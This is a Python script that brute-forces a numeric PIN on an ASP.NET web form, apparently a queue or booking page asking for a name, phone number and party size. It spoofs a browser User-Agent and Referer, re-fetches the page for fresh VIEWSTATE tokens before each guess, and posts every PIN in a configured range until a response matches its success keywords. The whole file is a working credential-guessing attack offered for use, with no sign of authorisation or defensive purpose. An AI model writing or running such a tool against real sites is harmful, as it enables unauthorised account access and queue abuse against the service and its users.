import time
import sys
import requests
from bs4 import BeautifulSoup
import settings


SESSION = requests.Session()
SESSION.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Referer": settings.URL,
})

SUCCESS_KEYWORDS = ["queue", "thank", "welcome", "success", "joined", "position", "waiting"]
FAILURE_KEYWORDS = ["invalid", "incorrect", "wrong", "error", "not found", "failed"]


def get_form_fields(html: str) -> dict:
    """Extract all form input fields (including hidden) from ASP.NET page."""
    soup = BeautifulSoup(html, "html.parser")
    fields = {}
    for inp in soup.find_all("input"):
        name = inp.get("name")
        value = inp.get("value", "")
        if name:
            fields[name] = value
    for sel in soup.find_all("select"):
        name = sel.get("name")
        if name:
            option = sel.find("option", selected=True) or sel.find("option")
            fields[name] = option.get("value", "") if option else ""
    return fields


def find_field(fields: dict, *keywords) -> str | None:
    """Find a field name that contains any of the given keywords (case-insensitive)."""
    for key in fields:
        for kw in keywords:
            if kw.lower() in key.lower():
                return key
    return None


def is_success(response_text: str, baseline_text: str) -> bool:
    text = response_text.lower()
    baseline = baseline_text.lower()

    for kw in SUCCESS_KEYWORDS:
        if kw in text and kw not in baseline:
            return True

    for kw in FAILURE_KEYWORDS:
        if kw in baseline and kw not in text:
            return True

    if len(response_text) != len(baseline_text):
        if any(kw in text for kw in SUCCESS_KEYWORDS):
            return True

    return False


def get_form_action(html: str, base_url: str) -> str:
    soup = BeautifulSoup(html, "html.parser")
    form = soup.find("form")
    if form and form.get("action"):
        action = form["action"]
        if action.startswith("http"):
            return action
        from urllib.parse import urljoin
        return urljoin(base_url, action)
    return base_url


def main():
    print(f"[*] Fetching page: {settings.URL}")
    resp = SESSION.get(settings.URL, timeout=15)
    resp.raise_for_status()
    baseline_html = resp.text

    fields = get_form_fields(baseline_html)
    action_url = get_form_action(baseline_html, settings.URL)

    print(f"[*] Form action: {action_url}")
    print(f"[*] Discovered {len(fields)} form fields:")
    for name, val in fields.items():
        display = val if len(val) < 60 else val[:57] + "..."
        print(f"    {name!r} = {display!r}")

    name_field = find_field(fields, "name", "fullname", "username", "cust")
    phone_field = find_field(fields, "phone", "mobile", "tel", "handphone", "contact", "hp", "no")
    pin_field = find_field(fields, "pin", "password", "pass", "pwd", "code", "ic")
    adults_field = find_field(fields, "adult", "pax", "guest")
    children_field = find_field(fields, "child", "kid", "children")

    print(f"\n[*] Detected name field    : {name_field!r}")
    print(f"[*] Detected phone field   : {phone_field!r}")
    print(f"[*] Detected PIN field     : {pin_field!r}")
    print(f"[*] Detected adults field  : {adults_field!r}")
    print(f"[*] Detected children field: {children_field!r}")

    if not phone_field or not pin_field:
        print("\n[!] Could not auto-detect phone/PIN fields.")
        print("[!] Available fields:", list(fields.keys()))
        print("[!] Update field detection in main.py to match the actual field names above.")
        sys.exit(1)

    if not settings.PHONE:
        print("\n[!] PHONE is not set in .env")
        sys.exit(1)

    print(f"\n[*] Name  : {settings.NAME or '(not set)'}")
    print(f"[*] Phone : {settings.PHONE}")
    print(f"[*] Adults: {settings.ADULTS}  Children: {settings.CHILDREN}")
    print(f"[*] PIN range: {settings.PIN_START} – {settings.PIN_END}")
    print(f"[*] Delay between attempts: {settings.DELAY}s")
    print(f"[*] Starting brute force...\n")

    total = settings.PIN_END - settings.PIN_START + 1

    for pin in range(settings.PIN_START, settings.PIN_END + 1):
        # Re-fetch page each time to get fresh VIEWSTATE / EVENTVALIDATION
        page_resp = SESSION.get(settings.URL, timeout=15)
        fresh_fields = get_form_fields(page_resp.text)

        payload = fresh_fields.copy()
        if name_field and settings.NAME:
            payload[name_field] = settings.NAME
        payload[phone_field] = settings.PHONE
        payload[pin_field] = str(pin)
        if adults_field:
            payload[adults_field] = str(settings.ADULTS)
        if children_field:
            payload[children_field] = str(settings.CHILDREN)

        try:
            post_resp = SESSION.post(action_url, data=payload, timeout=15, allow_redirects=True)
        except requests.RequestException as e:
            print(f"[!] Request error on PIN {pin}: {e}")
            time.sleep(1)
            continue

        progress = pin - settings.PIN_START + 1
        pct = progress / total * 100
        print(f"\r[{progress}/{total}] {pct:.1f}%  Trying PIN: {pin:05d} | HTTP {post_resp.status_code}", end="", flush=True)

        if is_success(post_resp.text, baseline_html):
            print(f"\n\n[+] SUCCESS! PIN found: {pin}")
            print(f"[+] Response URL: {post_resp.url}")
            return

        if settings.DELAY > 0:
            time.sleep(settings.DELAY)

    print(f"\n\n[-] No valid PIN found in range {settings.PIN_START}–{settings.PIN_END}.")


if __name__ == "__main__":
    main()
